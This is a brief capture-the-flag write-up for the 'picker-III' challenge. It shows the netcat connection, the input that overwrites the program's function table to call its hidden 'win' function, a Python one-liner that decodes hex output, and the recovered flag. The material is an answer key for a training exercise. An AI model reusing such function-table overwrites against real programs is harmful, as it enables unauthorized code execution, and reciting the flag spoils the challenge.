
## Descripción

Can you figure out how this program works to get the flag? Connect to the program with netcat:

`$ nc chatelaine.cylabacademy.net 45927`

The program's source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/0c20c076e50e377ab1ba1e162d33f882ab2caaa6c6766d463bf0af50cdd59d4a/picker-III.py).


1.- Is there any way to modify the function table?

## Solución
```
nc chatelaine.cylabacademy.net 45927

3

func_table

func_table[:96]+'win'+' '*29

4

python3 -c "print(bytes(int(x,16) for x in input('Hex: ').split()).decode())"

academy{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_948e866e}
```

## Notas Adicionales

## Referencias
